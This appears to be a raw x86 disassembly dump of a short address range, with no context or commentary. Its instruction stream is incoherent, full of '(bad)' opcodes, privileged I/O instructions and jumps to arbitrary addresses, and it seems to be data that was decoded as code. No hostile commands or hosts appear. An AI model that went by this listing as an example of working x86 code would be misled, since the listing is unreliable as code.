  4119b2:	repnz out 0x8f,eax
  4119b5:	lods   eax,DWORD PTR ds:[esi]
  4119b6:	sbb    ecx,edx
  4119b8:	imul   ebx,ebp,0x6f8e83d3
  4119be:	nop
  4119bf:	sub    bl,BYTE PTR [ecx]
  4119c1:	pop    ecx
  4119c2:	adc    dl,BYTE PTR [edx+0x6c5f1b5e]
  4119c8:	jns    0x411982
  4119ca:	adc    DWORD PTR [ebx+ecx*1+0x3275f717],0xffffffd1
  4119d2:	push   esp
  4119d3:	hlt    
  4119d4:	test   al,0x9d
  4119d6:	arpl   WORD PTR [ebp+0x54ef9477],sp
  4119dc:	aaa    
  4119dd:	dec    edx
  4119de:	imul   di,WORD PTR [ebp-0x47],0x4b
  4119e3:	(bad)  
  4119e4:	popa   
  4119e5:	sbb    ecx,0x5
  4119e8:	mov    BYTE PTR [edi+0x76],bl
  4119eb:	loop   0x4119bd
  4119ed:	sub    DWORD PTR [eax-0x37ad9b2b],0x4e
  4119f4:	test   BYTE PTR [edi-0x3b],ch
  4119f7:	ds gs popa 
  4119fa:	in     eax,dx
  4119fb:	jp     0x41199d
  4119fd:	and    bh,bl
  4119ff:	stc    
  411a00:	in     al,0xf2
  411a02:	popa   
  411a03:	jp     0x411a66
  411a05:	sub    al,0xa7
  411a07:	and    DWORD PTR [esi+0x1],0xffffffe6
  411a0b:	sahf   
  411a0c:	stc    
  411a0d:	sub    eax,0xdb95cd07
  411a12:	cmp    edx,DWORD PTR [ebp-0x10]
  411a15:	dec    eax
  411a16:	cmp    eax,esi
  411a18:	imul   BYTE PTR gs:[ebx+0x17e39146]
  411a1f:	mov    ecx,0x31428c2e
  411a24:	dec    edi
  411a25:	icebp  
  411a26:	mov    eax,ds:0xeee576de
  411a2b:	sbb    BYTE PTR [esp+edx*4],bl
  411a2e:	ss mov ecx,0xec01c9dc
  411a34:	cmp    edi,ebx
  411a36:	test   al,0x61
  411a38:	aad    0x9f
  411a3a:	add    BYTE PTR [ebp+edi*4+0x17e9aef0],cl
  411a41:	inc    edi
  411a42:	hlt    
  411a43:	popa   
  411a44:	add    BYTE PTR ds:[edx+0x1b],0x71
  411a49:	(bad)  
  411a4a:	es jae 0x411a0f
  411a4d:	hlt    
  411a4e:	nop
  411a4f:	adc    BYTE PTR [edx],bh
  411a51:	out    0xa4,eax
  411a53:	push   cs
  411a54:	sbb    DWORD PTR [ebx-0x22f048fb],edi
  411a5a:	xor    edx,DWORD PTR [ecx]
  411a5c:	int    0x44
  411a5e:	stos   BYTE PTR es:[edi],al
  411a5f:	and    ecx,DWORD PTR [eax+ebx*2]
  411a62:	in     al,dx
  411a63:	add    BYTE PTR [edx],dh
  411a65:	jp     0x411a9d
  411a67:	or     eax,0xcdd55524
  411a6c:	inc    ebx
  411a6d:	sub    eax,eax
  411a6f:	sbb    dh,BYTE PTR [edi]
  411a71:	stos   BYTE PTR es:[edi],al
  411a72:	fdiv   st(0),st
  411a74:	mov    bh,0xed
  411a76:	cli    
  411a77:	adc    eax,0x3f68de02
  411a7c:	cld    
  411a7d:	ja     0x411a3b
  411a7f:	outs   dx,BYTE PTR ds:[esi]
  411a80:	fstp   DWORD PTR [ebx+0x4bb073bb]
  411a86:	adc    al,0x78
  411a88:	call   FWORD PTR [esi+eiz*4+0x7bc9b6a2]
  411a8f:	or     dh,al
  411a91:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411a92:	xchg   DWORD PTR ds:0xe3168034,eax
  411a98:	cmp    al,ah
  411a9a:	out    dx,al
  411a9b:	mov    cl,0xf5
  411a9d:	cmp    al,0xba
  411a9f:	jae    0x411aeb
  411aa1:	(bad)  
  411aa2:	pop    ecx
  411aa3:	std    
  411aa4:	sbb    BYTE PTR [ecx],al
  411aa6:	mov    ebp,0x6893f0d
  411aab:	inc    ecx
  411aac:	inc    ecx
  411aad:	xor    al,0xec
  411aaf:	cdq    
  411ab0:	fistp  QWORD PTR [edi-0x2b]
  411ab3:	dec    edi
  411ab4:	lock and al,0x3b
  411ab7:	ins    BYTE PTR es:[edi],dx
  411ab8:	cmp    DWORD PTR [ebx],0xffffffb3
  411abb:	inc    ebp
  411abc:	sub    eax,0x4444c2d1
  411ac1:	loop   0x411ad8
  411ac3:	mov    ebp,0xfdc7a6a8
  411ac8:	dec    eax
  411ac9:	or     DWORD PTR [eax-0x31cc111b],ecx
  411acf:	call   0xf67f:0xb7a645c4
  411ad6:	cwde   
  411ad7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411ad8:	rcr    DWORD PTR [esi-0x23d74ff2],0xaa
  411adf:	mov    eax,0xc6d38f34
  411ae4:	sub    dh,BYTE PTR [ebp+ebp*8+0x63]
  411ae8:	js     0x411aea
  411aea:	dec    ebp
  411aeb:	test   BYTE PTR [esi],ch
  411aed:	psrlq  mm6,QWORD PTR [esi+ebp*1]
  411af1:	sub    al,0x78
  411af3:	cli    
  411af4:	mov    bh,0xb9
  411af6:	mov    gs,WORD PTR [eax+ebx*1-0x1ddf77bc]
  411afd:	mov    ds:0x51038d7e,al
  411b02:	or     eax,DWORD PTR [esi-0x4ad826d7]
  411b08:	sub    esi,edi
  411b0a:	push   0x75
  411b0c:	(bad)  
  411b0d:	pop    edx
  411b0e:	mov    ch,0xd4
  411b10:	retf   
  411b11:	jns    0x411aa4
  411b13:	sbb    esp,DWORD PTR [ebx-0x33]
  411b16:	mov    eax,0xbd632f46
  411b1b:	sub    cl,BYTE PTR [edi-0x15]
  411b1e:	cdq    
  411b1f:	arpl   WORD PTR [edi+0x1a],ax
  411b22:	loopne 0x411b67
  411b24:	mov    al,0xa
  411b26:	inc    esi
  411b27:	retf   
  411b28:	or     BYTE PTR ds:[ecx-0x79],dh
  411b2c:	hlt    
  411b2d:	rol    BYTE PTR [esi+0x6505f225],0xed
  411b34:	xchg   ebx,eax
  411b35:	xor    BYTE PTR [edx],bl
  411b37:	jmp    DWORD PTR [ebx+0x21c4aed8]
  411b3d:	fs mov bl,0xd2
  411b40:	outs   dx,DWORD PTR ds:[esi]
  411b41:	mov    dl,0x31
  411b43:	and    esp,DWORD PTR [esi]
  411b45:	xchg   ebp,eax
  411b46:	popa   
  411b47:	xchg   edi,eax
  411b48:	and    BYTE PTR [edx+0x19],bh
  411b4b:	or     esi,0x27
  411b4e:	and    esp,esi
  411b50:	jecxz  0x411bc2
  411b52:	sbb    ebx,DWORD PTR [ebx]
  411b54:	cmp    ecx,DWORD PTR [esi+0x7d]
  411b57:	addr16 xor eax,esp
  411b5a:	shl    DWORD PTR [ecx-0x42ff7891],1
  411b60:	pop    es
  411b61:	cmp    BYTE PTR [ebx],al
  411b63:	cmp    BYTE PTR [ebp-0x4b],0x8e
  411b67:	mov    cl,0x86
  411b69:	test   DWORD PTR [esi-0x37a997af],esi
  411b6f:	mov    eax,0xaaaf6a84
  411b74:	inc    eax
  411b75:	aaa    
  411b76:	(bad)  
  411b77:	jmp    0xae98:0xc21b9094
  411b7e:	jo     0x411bae
  411b80:	cld    
  411b81:	or     eax,0xd47178ab
  411b86:	mov    bl,0x90
  411b88:	mov    bl,0x67
  411b8a:	adc    DWORD PTR [ebx],esp
  411b8c:	sbb    cl,dh
  411b8e:	add    BYTE PTR [edx+0x20341bb6],dh
  411b94:	or     esp,esp
  411b96:	imul   BYTE PTR [eax+edi*8+0x38]
  411b9a:	pushf  
  411b9b:	jmp    0x411b8e
  411b9d:	adc    edx,edx
  411b9f:	js     0x411bc1
  411ba1:	iret   
  411ba2:	mov    ebx,0x67e4afd6
  411ba7:	pushf  
  411ba8:	inc    esp
  411ba9:	pop    ecx
  411baa:	cwde   
  411bab:	mov    edx,0xa8eef683
  411bb0:	int3   
  411bb1:	int3   
  411bb2:	loope  0x411b49
  411bb4:	jae    0x411b8f
  411bb6:	ins    BYTE PTR es:[edi],dx
  411bb7:	mov    bl,0x58
  411bb9:	aas    
  411bba:	or     ecx,DWORD PTR [esi]
  411bbc:	dec    ebp
  411bbd:	mov    cl,0x9
  411bbf:	xchg   esp,eax
  411bc0:	test   eax,0x80feed51
  411bc5:	fisttp QWORD PTR [ebx]
  411bc7:	xchg   esp,eax
  411bc8:	xchg   esi,eax
  411bc9:	sbb    ebp,0xc4569eb
  411bcf:	mov    dh,0x6c
  411bd1:	xor    BYTE PTR [eax-0x66],dl
  411bd4:	hlt    
  411bd5:	cmp    bh,BYTE PTR [ecx+0x1f6dae87]
  411bdb:	pop    esp
  411bdc:	rcl    BYTE PTR [esi-0x22],0xec
  411be0:	fs pushf 
  411be2:	sub    ebp,0xbdb3942f
  411be8:	ins    BYTE PTR es:[edi],dx
  411be9:	popa   
  411bea:	sahf   
  411beb:	mov    edi,0x3cafead3
  411bf0:	and    ch,ch
  411bf2:	ret    0xe77b
  411bf5:	out    0x49,eax
  411bf7:	cmp    eax,0x1e5bfb8d
  411bfc:	mov    edx,0x4c9d79f6
  411c01:	push   ds
  411c02:	xor    bh,ah
  411c04:	sub    al,bl
  411c06:	shl    ch,cl
  411c08:	fisttp DWORD PTR [ecx+0x2]
  411c0b:	or     ebx,DWORD PTR [ebp-0x6b]
  411c0e:	(bad)  
  411c10:	or     BYTE PTR [edi-0xc],bl
  411c13:	ror    esp,1
  411c15:	fisubr DWORD PTR [esi-0x406262bb]
  411c1b:	stos   BYTE PTR es:[edi],al
  411c1c:	stc    
  411c1d:	loope  0x411bae
  411c1f:	sbb    ch,BYTE PTR [edx-0x12]
  411c22:	int3   
  411c23:	mov    ecx,0x1c905dea
  411c28:	mov    bh,0x25
  411c2a:	jle    0x411c91
  411c2c:	xor    ebp,ebp
  411c2e:	push   ds
  411c2f:	push   cs
  411c30:	inc    eax
  411c31:	add    ah,ah
  411c33:	outs   dx,DWORD PTR ds:[esi]
  411c34:	gs (bad) 
  411c37:	mov    edx,0x3597006e
  411c3c:	sub    ch,BYTE PTR [ebx]
  411c3e:	data16 loop 0x411c3e
  411c41:	fadd   DWORD PTR [edi]
  411c43:	adc    DWORD PTR [edx+0x22dcdb6f],edx
  411c49:	mov    BYTE PTR [ebx+0x24],dh
  411c4c:	imul   ecx,ebp,0x404479b7
  411c52:	cmp    al,0xb4
  411c54:	cli    
  411c55:	jge    0x411c9a
  411c57:	cs sub eax,0x55923173
  411c5d:	or     edi,DWORD PTR [ebp-0x11]
  411c60:	das    
  411c61:	pop    edi
  411c62:	or     DWORD PTR [eax+0x29d00708],ebp
  411c68:	push   edx
  411c69:	in     eax,0xeb
  411c6b:	xor    esi,edi
  411c6d:	mov    ebx,0x3e5c8e53
  411c72:	xchg   BYTE PTR [esi],dl
  411c74:	add    al,0xd4
  411c76:	loope  0x411cd8
  411c78:	mov    ebp,0xc6ee58f8
  411c7d:	jno    0x411ca3
  411c7f:	push   ebp
  411c80:	ins    BYTE PTR es:[edi],dx
  411c81:	xor    edx,edx
  411c83:	or     BYTE PTR [edx],dl
  411c85:	xchg   ebp,eax
  411c86:	jae    0x411cfd
  411c88:	cmp    edx,DWORD PTR [eax+edx*4]
  411c8b:	daa    
  411c8c:	push   ds
  411c8d:	sbb    DWORD PTR [edi],ebp
  411c8f:	jmp    0x411c58
  411c91:	sub    BYTE PTR ds:0xedd78b98,bl
  411c97:	or     DWORD PTR [edi+0x43],esp
  411c9a:	or     eax,0xe8d9ca26
  411c9f:	xchg   esi,eax
  411ca0:	xchg   BYTE PTR [eax+0x13],dl
  411ca3:	addr16 dec esp
  411ca5:	jmp    0x744f45aa
  411caa:	xchg   esp,eax
  411cab:	or     BYTE PTR [edx+0x6789c698],dl
  411cb1:	dec    esp
  411cb2:	sar    BYTE PTR [esi],1
  411cb4:	inc    eax
  411cb5:	fadd   DWORD PTR [esi]
  411cb7:	dec    edi
  411cb8:	push   ss
  411cb9:	in     eax,0x69
  411cbb:	iret   
  411cbc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411cbd:	scas   al,BYTE PTR es:[edi]
  411cbe:	add    BYTE PTR [ebx+eiz*2+0x4c9ff1df],dh
  411cc5:	pushf  
  411cc6:	cld    
  411cc7:	dec    esp
  411cc8:	lods   eax,DWORD PTR ds:[esi]
  411cc9:	mov    esp,0x60de9d92
  411cce:	add    edx,DWORD PTR [eax-0x1b]
  411cd1:	sahf   
  411cd2:	retf   
  411cd3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411cd4:	(bad)
  411cd7:	jecxz  0x411c5c
  411cd9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411cda:	jb     0x411d18
  411cdc:	pop    esi
  411cdd:	mov    edi,0x9a4424b2
  411ce2:	scas   al,BYTE PTR es:[edi]
  411ce3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411ce4:	jp     0x411d50
  411ce6:	nop
  411ce7:	nop
  411ce8:	push   ecx
  411ce9:	cs mov eax,0xe7d2342a
  411cef:	inc    ecx
  411cf0:	in     eax,dx
  411cf1:	lds    ecx,FWORD PTR [esi+ecx*4+0x25f11adf]
  411cf8:	fisub  DWORD PTR [eax-0x41]
  411cfb:	jle    0x411d28
  411cfd:	or     eax,0x192a4573
  411d02:	cmp    BYTE PTR [edi+esi*8],bl
  411d05:	dec    esi
  411d06:	push   eax
  411d07:	sti    
  411d08:	imul   edi,DWORD PTR [ebp-0x3dd000eb],0xd7426c57
  411d12:	adc    ch,BYTE PTR [esi]
  411d14:	sbb    ebx,esp
  411d16:	cmp    al,BYTE PTR [ebx+0x44]
  411d19:	push   ebx
  411d1a:	sti    
  411d1b:	sbb    esi,edi
  411d1d:	sbb    eax,0x693cd6ff
  411d22:	and    BYTE PTR [ebp+ecx*1+0x73],ch
  411d26:	or     edi,DWORD PTR [ebx+eax*2-0x53]
  411d2a:	fild   WORD PTR [edx-0x37]
  411d2d:	push   esp
  411d2e:	xor    eax,0xf8c13bb0
  411d33:	cmp    esp,esi
  411d35:	test   al,0x6f
  411d37:	es jecxz 0x411cfc
  411d3a:	inc    esi
  411d3b:	aam    0x53
  411d3d:	xchg   edi,eax
  411d3e:	push   ecx
  411d3f:	pop    ds
  411d40:	push   cs
  411d41:	mov    ebp,0xaea06cb1
  411d46:	add    al,0xed
  411d48:	push   0x52ab6c08
  411d4d:	adc    DWORD PTR [ebx],0xffffffcf
  411d50:	rcr    DWORD PTR [ebp+edx*8+0x3f7390e8],1
  411d57:	push   ecx
  411d58:	adc    al,0xe
  411d5a:	cmp    esp,ebp
  411d5c:	mov    al,ds:0xb1858db
  411d61:	ja     0x411d53
  411d63:	aam    0xc1
  411d65:	push   0x4d85f0c1
  411d6a:	daa    
  411d6b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411d6c:	imul   esp,edx,0x2c867fc0
  411d72:	std    
  411d73:	and    BYTE PTR [ebp-0x1d],ah
  411d76:	ins    DWORD PTR es:[edi],dx
  411d77:	daa    
  411d78:	and    al,0xe3
  411d7a:	js     0x411dd1
  411d7c:	clc    
  411d7d:	in     al,0x34
  411d7f:	mov    ebx,0x5415dddd
  411d84:	lea    edi,[eax-0x1c]
  411d87:	mov    ds:0x7b21b23,al
  411d8c:	or     eax,0x1bceb7d5
  411d91:	inc    BYTE PTR [esi+0x5c05865]
  411d97:	mov    ebx,0x4074f187
  411d9c:	and    DWORD PTR [edx+0x3fd431e],ecx
  411da2:	push   cs
  411da3:	pand   mm7,mm7
  411da6:	mov    ch,0xb7
  411da8:	mov    bh,BYTE PTR [ebx-0x67]
  411dab:	popf   
  411dac:	imul   DWORD PTR [edx+0x56]
  411daf:	or     eax,0x1e912681
  411db4:	cmp    eax,0x147152c6
  411db9:	mov    esp,0x1aba2559
  411dbe:	jno    0xa4b46d9c
  411dc4:	add    edx,DWORD PTR [eax]
  411dc6:	xchg   esp,eax
  411dc7:	rcr    esi,1
  411dc9:	sahf   
  411dca:	lock xchg edi,eax
  411dcc:	jle    0x411dc7
  411dce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411dcf:	fucomip st,st(0)
  411dd1:	inc    ebx
  411dd2:	test   BYTE PTR [edi-0x3c],dl
  411dd5:	xor    DWORD PTR cs:[ebp-0x52db2b10],esi
  411ddc:	sahf   
  411ddd:	xchg   esp,eax
  411dde:	mov    edi,0x18bf33ce
  411de3:	sti    
  411de4:	stos   DWORD PTR es:[edi],eax
  411de5:	xor    al,0x18
  411de7:	inc    edi
  411de8:	fadd   st,st(3)
  411dea:	jp     0x411dd3
  411dec:	cdq    
  411ded:	in     eax,dx
  411dee:	add    DWORD PTR [ebx+0x4a],edi
  411df1:	inc    eax
  411df2:	and    BYTE PTR [ecx-0x23],bh
  411df5:	and    DWORD PTR [eax-0x106a72b7],eax
  411dfb:	sub    eax,0xf66c1ed4
  411e00:	mov    ecx,0x8f81d386
  411e05:	ficom  WORD PTR [esi]
  411e07:	rol    ah,0x45
  411e0a:	lahf   
  411e0b:	loopne 0x411e4b
  411e0d:	out    0x5,eax
  411e0f:	fwait
  411e10:	call   0xcc94784d
  411e15:	add    BYTE PTR [ebx],bl
  411e17:	pop    eax
  411e18:	add    BYTE PTR [ecx+ebp*1],dl
  411e1b:	push   0xffffffbf
  411e1d:	jnp    0x411e10
  411e1f:	xchg   DWORD PTR [eax-0x65],edi
  411e22:	mov    BYTE PTR [ebx-0x46c19bc0],ch
  411e28:	inc    ecx
  411e29:	mov    ch,0x33
  411e2b:	add    esi,DWORD PTR [eax+0x1368c58a]
  411e31:	xchg   ecx,edi
  411e33:	pushf  
  411e34:	xchg   ebx,eax
  411e35:	hlt    
  411e36:	int    0x81
  411e38:	add    DWORD PTR [edx],ebx
  411e3a:	iret   
  411e3b:	or     ebx,DWORD PTR [eax]
  411e3d:	and    al,0x2a
  411e3f:	repnz sbb al,0x1e
  411e42:	test   al,0xcb
  411e44:	mov    dh,0x93
  411e46:	clc    
  411e47:	mov    ds,WORD PTR [edx-0x580790be]
  411e4d:	clc    
  411e4e:	loop   0x411dde
  411e50:	adc    eax,0xa825bc75
  411e55:	xchg   BYTE PTR ds:0x16f5258b,bh
  411e5b:	push   ebx
  411e5c:	ds xchg ebx,eax
  411e5e:	and    esp,edi
  411e60:	stc    
  411e61:	push   ds
  411e62:	into   
  411e63:	or     ah,bl
  411e65:	clc    
  411e66:	retf   
  411e67:	ins    BYTE PTR es:[edi],dx
  411e68:	xor    eax,0x266db4d9
  411e6d:	mul    DWORD PTR ss:[edi*1-0xf8d9a53]
  411e75:	pop    ebp
  411e76:	xor    ebx,0xd1a356fb
  411e7c:	aad    0x58
  411e7e:	cwde   
  411e7f:	repnz dec edi
  411e81:	xor    dh,BYTE PTR [ebx]
  411e83:	push   ss
  411e84:	shr    BYTE PTR [ecx+ecx*1+0x71],1
  411e88:	xor    dl,al
  411e8a:	ficom  DWORD PTR [esi+0x74f31e27]
  411e90:	inc    edi
  411e91:	mov    esp,0x30c5f835
  411e96:	gs xor eax,0x6880f468
  411e9c:	repz sbb DWORD PTR [ebx-0x69],0x33
  411ea1:	mov    ebp,0xd2e5b934
  411ea6:	lahf   
  411ea7:	sbb    esp,DWORD PTR [esi]
  411ea9:	cmp    cl,bh
  411eab:	out    dx,eax
  411eac:	fst    DWORD PTR [edx]
  411eae:	lea    ebx,[edi+ecx*1-0x2d02e3ba]
  411eb5:	and    BYTE PTR [esi-0x444b6d3e],bh
  411ebb:	jge    0x411ea6
  411ebd:	rcl    DWORD PTR [eax+0x70922e89],cl
  411ec3:	or     ch,al
  411ec5:	jmp    0x5cb41762
  411eca:	mov    esp,0x5fe50ca7
  411ecf:	push   ss
  411ed0:	mov    bl,0x35
  411ed2:	push   ebp
  411ed3:	push   edx
  411ed4:	cmp    ecx,ecx
  411ed6:	push   edi
  411ed7:	and    al,0xcd
  411ed9:	mov    eax,0x30170020
  411ede:	xlat   BYTE PTR ds:[ebx]
  411edf:	xor    al,BYTE PTR [eax]
  411ee1:	jmp    0x7d48323d
  411ee6:	xchg   ebx,eax
  411ee7:	cld    
  411ee8:	out    0x82,al
  411eea:	cmp    edi,ebp
  411eec:	mov    bh,0x95
  411eee:	ja     0x411eb1
  411ef0:	add    BYTE PTR [edx],0xa7
  411ef3:	adc    al,0x51
  411ef5:	popa   
  411ef6:	mov    eax,0x3161e3d1
  411efb:	outs   dx,DWORD PTR ds:[esi]
  411efc:	int3   
  411efd:	retf   
  411efe:	adc    ah,dl
  411f00:	mov    al,ds:0x8eeeb2f4
  411f05:	push   edx
  411f06:	dec    edx
  411f07:	lods   eax,DWORD PTR ds:[esi]
  411f08:	push   ecx
  411f09:	mov    DWORD PTR [ecx],esp
  411f0b:	jbe    0x411eb1
  411f0d:	fmul   DWORD PTR [eax+0x22]
  411f10:	jge    0x411f1b
  411f12:	xlat   BYTE PTR ds:[ebx]
  411f13:	retf   
  411f14:	call   0x1c64:0xcd3c1b55
  411f1b:	popf   
  411f1c:	(bad)  
  411f1d:	xlat   BYTE PTR ds:[ebx]
  411f1e:	ret    0x9b57
  411f21:	sub    dh,BYTE PTR [esi+esi*2]
  411f24:	or     eax,esi
  411f26:	and    BYTE PTR [esi+0x405e8635],cl
  411f2c:	in     al,0xc4
  411f2e:	mov    cs,WORD PTR [ebx+0x18]
  411f31:	fcomp  st(4)
  411f33:	lock call 0xd9fc:0x919fed8b
  411f3b:	loope  0x411f5a
  411f3d:	fwait
  411f3e:	imul   esp,DWORD PTR [eax-0x44],0x6879dd43
  411f45:	mov    ds:0xf55ecbfa,al
  411f4a:	mov    BYTE PTR [ebx],cl
  411f4c:	mov    BYTE PTR [ebx+0x1861544f],al
  411f52:	pop    ds
  411f53:	lods   eax,DWORD PTR ds:[esi]
  411f54:	repnz inc ebx
  411f56:	clc    
  411f57:	pop    es
  411f58:	mov    edx,0x25b5a4d7
  411f5d:	cdq    
  411f5e:	jno    0x411ee4
  411f60:	dec    ebp
  411f62:	mov    al,ds:0xc87a53c2
  411f67:	inc    ebp
  411f68:	mov    dh,0x80
  411f6a:	or     bh,BYTE PTR [edx+0x1d]
  411f6d:	fldz   
  411f6f:	jae    0x411fbf
  411f71:	xor    dl,ch
  411f73:	push   es
  411f74:	ins    BYTE PTR es:[edi],dx
  411f75:	sub    dl,ah
  411f77:	dec    ecx
  411f78:	out    dx,al
  411f79:	ds mov bl,0x30
  411f7c:	add    eax,0x5946e8b8
  411f81:	sbb    ecx,DWORD PTR [edx+0x4d]
  411f84:	cmove  ebx,DWORD PTR [edi+0x1e]
  411f88:	fbstp  TBYTE PTR [ebp+0xfd3c2c4]
  411f8e:	(bad)  
  411f8f:	iret   
  411f90:	push   cs
  411f91:	inc    esi
  411f92:	and    ah,BYTE PTR [edx]
  411f94:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411f95:	stos   DWORD PTR es:[edi],eax
  411f96:	loope  0x411fd7
  411f98:	dec    esp
  411f99:	inc    esp
  411f9a:	sti    
  411f9b:	or     al,0x1a
  411f9d:	dec    BYTE PTR [ebx+0x19]
  411fa0:	loop   0x411fe7
  411fa2:	and    eax,DWORD PTR [ecx-0x76]
  411fa5:	test   edi,edx
  411fa7:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411fa9:	mov    cl,0x67
  411fab:	cmp    al,0xf3
  411fad:	clc    
  411fae:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  411fb0:	mov    ds:0x3a340dd7,eax
  411fb5:	fs push ebx
  411fb7:	push   ebx
  411fb8:	sub    edi,DWORD PTR ds:0x99089a5
  411fbe:	outs   dx,BYTE PTR ss:[esi]
  411fc0:	cmp    DWORD PTR [edi+ecx*1],ebp
  411fc3:	xchg   edi,eax
  411fc4:	inc    esp
  411fc5:	mov    ecx,0x9b83b7aa
  411fca:	aas    
  411fcb:	xchg   BYTE PTR [eax],bh
  411fcd:	cmp    eax,0xa2939e1f
  411fd2:	stos   BYTE PTR es:[edi],al
  411fd3:	stc    
  411fd4:	fisttp WORD PTR [ecx]
  411fd6:	adc    esp,DWORD PTR [ecx-0x174fe1ea]
  411fdc:	inc    ebp
  411fdd:	outs   dx,BYTE PTR ds:[esi]
  411fde:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411fdf:	cmp    al,0xe5
  411fe1:	fisttp DWORD PTR [ecx+0x4e]
  411fe4:	sbb    bh,BYTE PTR [esi-0x2]
  411fe7:	xchg   edx,eax
  411fe8:	mov    dh,0xe5
  411fea:	scas   al,BYTE PTR es:[edi]
  411feb:	jmp    0x1db3ad5e
  411ff0:	mov    ebx,0xa4d0fdf9
  411ff5:	xchg   edi,eax
  411ff6:	(bad)  
  411ff7:	imul   BYTE PTR [edx+ebx*8]
  411ffa:	shr    DWORD PTR [ebx-0x32],1
  411ffd:	xchg   esp,eax
  411ffe:	jmp    0x411f9c
  412000:	dec    esi
  412001:	mov    dh,0xdc
  412003:	sub    BYTE PTR [eax-0x37],bh
  412006:	mov    ebp,0xbd64ff49
  41200b:	pop    esi
  41200c:	mov    bl,0x12
  41200e:	xor    BYTE PTR [edi+0x5a],dh
  412011:	lods   eax,DWORD PTR ds:[esi]
  412012:	mov    cl,0x70
  412014:	jbe    0x411fdd
  412016:	and    eax,0x585085c2
  41201b:	xchg   ecx,eax
  41201c:	jmp    0xe68d:0x90757625
  412023:	icebp  
  412024:	test   BYTE PTR ds:0x1764bd10,0xe7
  41202b:	jle    0x411ff5
  41202d:	jnp    0x411fe2
  41202f:	mov    esi,0x1e91d710
  412034:	pop    ds
  412035:	fnstsw WORD PTR [eax-0x47]
  412038:	xchg   ecx,eax
  412039:	jp     0x411ffb
  41203b:	mov    ds:0x7cf93359,al
  412040:	cld    
  412041:	pop    edx
  412042:	jo     0x4120b3
  412044:	xchg   ebx,eax
  412045:	shl    BYTE PTR [edx+0x7b],0xc6
  412049:	push   eax
  41204a:	ins    DWORD PTR es:[edi],dx
  41204b:	in     al,0xc0
  41204d:	pusha  
  41204e:	loope  0x41202d
  412050:	push   ds
  412051:	push   cs
  412052:	pushf  
  412053:	mov    esp,0xc3922f73
  412058:	(bad)  
  412059:	loopne 0x4120b6
  41205b:	xchg   ebx,eax
  41205c:	adc    DWORD PTR [ebx-0x39],eax
  41205f:	js     0x41200e
  412061:	mov    ecx,0xac75e3e9
  412066:	jmp    FWORD PTR [ebx+ebx*2-0x64]
  41206a:	xchg   ebx,eax
  41206b:	sub    bl,BYTE PTR [eax]
  41206d:	inc    ecx
  41206e:	ror    DWORD PTR [ebx-0x79154277],0xea
  412075:	icebp  
  412076:	popf   
  412077:	xor    DWORD PTR [edx+edi*4-0x57f7af59],edi
  41207e:	pop    ss
  41207f:	add    eax,0xa7ebf09d
  412085:	in     eax,0x1d
  412087:	push   edx
  412088:	sti    
  412089:	xchg   BYTE PTR [edi],bh
  41208b:	adc    al,0x2b
  41208d:	add    eax,0xcfb0df76
  412092:	jns    0x4120a6
  412094:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412095:	cmp    esi,DWORD PTR [edi]
  412097:	and    BYTE PTR [esi+0xf],al
  41209a:	lods   eax,DWORD PTR ds:[esi]
  41209b:	mov    DWORD PTR [ebp-0x71],ebp
  41209e:	in     al,dx
  41209f:	out    0xd7,al
  4120a1:	sbb    al,0x77
  4120a3:	push   esi
  4120a4:	hlt    
  4120a5:	nop
  4120a6:	sub    eax,0xdcd00450
  4120ab:	pop    edx
  4120ac:	fst    QWORD PTR [edx+0x73]
  4120af:	mov    bl,0x1f
  4120b1:	sub    al,0x7e
  4120b3:	cs mov ch,bh
  4120b6:	mov    ecx,cs
  4120b8:	in     eax,0xd4
  4120ba:	repnz dec ebp
  4120bc:	xchg   edx,eax
  4120bd:	fwait
  4120be:	xor    DWORD PTR [ebx],0x6f
  4120c1:	inc    edx
  4120c2:	out    dx,al
  4120c3:	stos   BYTE PTR es:[edi],al
  4120c4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4120c5:	adc    al,0x73
  4120c7:	stos   BYTE PTR es:[edi],al
  4120c8:	push   ebx
  4120c9:	xchg   edi,eax
  4120ca:	sub    al,0x9
  4120cc:	xchg   ebp,eax
  4120cd:	pop    esp
  4120ce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4120cf:	cli    
  4120d0:	xor    DWORD PTR [ecx],ebp
  4120d2:	lahf   
  4120d3:	fbstp  TBYTE PTR [ebp-0x4f468192]
  4120d9:	int    0x4f
  4120db:	mov    ah,BYTE PTR [ebp+ebx*2+0xa290801]
  4120e2:	sub    ecx,ebx
  4120e4:	int    0x86
  4120e6:	test   eax,0xa82521fc
  4120eb:	in     eax,0xc6
  4120ed:	xor    bl,BYTE PTR [ebp-0x25]
  4120f0:	dec    edx
  4120f1:	dec    edx
  4120f2:	jae    0x4120ee
  4120f4:	pop    ss
  4120f5:	arpl   WORD PTR [eax+ebp*1],si
  4120f8:	mov    BYTE PTR [ecx-0x23],bl
  4120fb:	cli    
  4120fc:	loopne 0x41211a
  4120fe:	mov    eax,0x27dfb23c
  412103:	xor    eax,0x95db43dd
  412108:	(bad)  
  412109:	(bad)  
  41210a:	or     DWORD PTR [ecx],ebx
  41210c:	retf   0x7a94
  41210f:	cmp    BYTE PTR ds:0x3d611e6,cl
  412115:	sub    BYTE PTR [ecx],al
  412117:	inc    ebp
  412118:	fdiv   DWORD PTR [ebx]
  41211a:	mov    ecx,DWORD PTR ds:0xb62a4117
  412120:	pop    ebp
  412121:	ror    BYTE PTR [esi],1
  412123:	lahf   
  412124:	test   al,0x7d
  412126:	mov    bh,0xcc
  412128:	and    ebp,DWORD PTR ds:0x2787ffd5
  41212e:	jle    0x4120e2
  412130:	adc    eax,0x886917a9
  412135:	adc    eax,0x56427c19
  41213a:	sbb    BYTE PTR [ebx+0x268c0ef9],bh
  412140:	inc    edi
